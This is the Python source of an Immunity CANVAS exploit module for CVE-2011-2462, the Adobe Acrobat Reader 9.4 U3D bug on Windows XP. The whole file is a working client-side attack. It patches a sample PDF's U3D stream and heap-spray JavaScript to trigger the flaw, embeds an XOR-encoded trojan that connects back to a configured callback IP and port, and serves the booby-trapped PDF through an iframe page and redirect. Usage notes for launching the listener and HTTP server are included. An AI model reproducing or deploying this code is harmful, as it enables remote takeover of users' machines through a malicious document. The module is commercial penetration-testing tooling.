#! /usr/bin/env python
#Copyright Immunity Federal Services, LLC 2011

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct
import urllib
import string

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from shellcode import shellcodeGenerator
from shellcode.standalone.windows import payloads
from engine.config import canvas_root_directory
from MOSDEF import pelib
import canvasengine

NAME                              = 'Adobe Acrobat Reader U3D bug'
DESCRIPTION                       = NAME
DOCUMENTATION                     = {}
DOCUMENTATION['Date public']      = '6 December 2011'
DOCUMENTATION['References']       = 'http://www.symantec.com/connect/blogs/new-zero-day-pdf-exploit-used-targeted-attack'
DOCUMENTATION['Repeatability']    = 'Infinite'
DOCUMENTATION['CVE Name']         = 'CVE-2011-2462'
DOCUMENTATION['CVE URL']          = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2462'
DOCUMENTATION['VersionsAffected'] = '9.4'
VERSION                           = '1.0'

PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['DELIVERY' ]             = 'HTTP'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP']
PROPERTY['VENDOR']                = 'Adobe'

NOTES                             = """
Tested on:
Windows XP SP3 with Adobe Acrobat Reader 9.4.0

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:pdf_u3d -l 192.168.200.44 -d 5555 -p 8080
"""

CHANGELOG                         = """
"""

targets                           = {
    0: ['Autodetect',0],
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

PDF_OVERHEAD = 0x371C  #XXX May change if we do something different to the PDF

class theexploit(tcpexploit, httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)

        self.clientversion = 1
        self.badstring     = ''
        self.name          = NAME
        self.pdffilename   = 'file.pdf'
        self.htmlfilename  = 'file.html'
        self.sample_pdf    = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/", "u3d_sample.pdf"))
        self.javascript    = ''

    def is_vulnerable(self, info_dict):
        if not self.isWindowsXP(info_dict): return 0
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major: return 0
        if major == 9 and minor <= 4: return 100
        return 0

    def jsEncodeDword(self, dword1):
        dword = dword1 ^ 0x97979797
        a = (dword & 0xff000000) >> 24
        b = (dword & 0x00ff0000) >> 16
        c = (dword & 0x0000ff00) >> 8
        d = dword & 0x000000ff
        js = "%02x%02xMM%02x%02x"%(c, d, a, b)
        return js

    def makePDF(self):
        #Open the sample PDF
        reader = PdfFileReader(file(self.sample_pdf,'rb'))

        #Add our executable
        from libs.canvasos import *
        t_os        = canvasos('WINDOWS')
        t_os.arch   = 'X86'
        trojan = self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)
        exe = self.mosdeftrojan
        exe_len = len(exe)
        total_len = PDF_OVERHEAD + exe_len
        payload_exe = 'M'
        for i in range(1, exe_len):
            payload_exe += chr(ord(exe[i]) ^ 0x12)
        exeobj = StreamObject()
        exeobj._data = payload_exe

        #Extract and modify the U3D data (exploit trigger)
        u3dobj = IndirectObject(10,0,reader).getObject()
        u3ddata = decodeStreamData(u3dobj)
        #u3ddata = string.replace(u3ddata, "RRR", "\x0c\x0c\x0c")
        #u3ddata = string.replace(u3ddata, "RR", "\x0c\x0c")
        u3ddata = string.replace(u3ddata, "RRRR", "\x0c\x0c\x0c\x1c")
        u3dobj._data = u3ddata
        u3dobj[NameObject('/Filter')] = NullObject()

        #Extract and modify the Javascript
        jsobj = reader.trailer['/Root']['/OpenAction']['/JS'].getObject()
        jsdata = FlateDecode.decode(jsobj._data, None)
        jsdata = string.replace(jsdata, '\x00', '>')
        jsdata = ASCIIHexDecode.decode(jsdata, None)
        jsdata = string.replace(jsdata, "9b97MM9b9b", "xxSSxx")
        jsdata = string.replace(jsdata, "9b9bMM9b9b", "9b9bMM8b9b")
        jsdata = string.replace(jsdata, "xxSSxx", "9b97MM9b9b")
        jsdata = string.replace(jsdata, "0c0cMM0c0c", "0c0cMM1c0c")
        jsdata = string.replace(jsdata, '"M" + "M" + "0" + "c" + "0" + "c"', '"MM"+"0c"+"0c"+"MM" + "1c" + "0c"')
        #jsdata = string.replace(jsdata, "9090", "90cc") #Set an int 3
        jsdata = string.replace(jsdata, "ad2fMM9796", self.jsEncodeDword(total_len)) #set the file length
        jsdata = string.replace(jsdata, "9ffe", "a234") #set the offset to the file data XXX: may change if any of the above code changes
        jsdata = string.replace(jsdata, "0b97MM9797", self.jsEncodeDword(exe_len)) #set the length to write
        #jump to the TerminateProcess code (skip dropping and opening a real PDF)
        jsdata = string.replace(jsdata, "c21cMMc52bMMc268", "977eMM9795MMc297")
        jsobj._data = jsdata
        jsobj[NameObject('/Filter')] = NullObject()

        #Close everything and write out the PDF
        output=PdfFileWriter()
        for num in range(0,reader.getNumPages()):
            output.addPage(reader.getPage(num))
        root=output._root.getObject()
        root.update({NameObject('/OpenAction'):reader.trailer['/Root']['/OpenAction'],\
                     NameObject('/AcroForm'):reader.trailer['/Root']['/AcroForm'],\
                     NameObject('/PreviewImg'):exeobj})

        outbuf = StringIO()
        output.write(outbuf)
        pdfdata = outbuf.getvalue()
        f = open('new.pdf', 'wb')
        f.write(pdfdata)
        f.close()
        self.log('Wrote pdf to new.pdf')
        return pdfdata

    def makeJS(self):
        js = """
        divelem = document.getElementById("ifdiv");
        divelem.innerHTML = "<IFRAME src=\\"%s\\" frameborder=0 scrolling=no width=100%% height=100%%></IFRAME>";
        """%(self.pdffilename)
        return js

    def makeHTML(self):
        self.javascript = self.makeJS()
        webpage="<HTML><BODY>\n"
        webpage+="<DIV id=\"ifdiv\"></DIV>\n"
        webpage+="<SCRIPT language=\"javascript\">%s</SCRIPT>\n"%self.javascript
        webpage+="</BODY></HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file for requested URL: %s'%clientheader.URL)
            b.setBody(self.makeHTML())
        elif clientheader.URL.count(self.pdffilename):
            self.log('Serving PDF file for requested URL: %s'%clientheader.URL)
            b.setBody(self.makePDF())
        elif '.ico' in clientheader.URL:
            self.log('Sending 404 response to icon request: %s'%clientheader.URL);
            h.status = '404'
            b.setBody('File not found.')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','binary/octet-stream')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        return

    def run(self):
        self.getArgs()
        filedata=self.makePDF()
        self.log('Opening %s for output'%(self.pdffilename))
        fd=file(self.pdffilename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.pdffilename))
        return 1
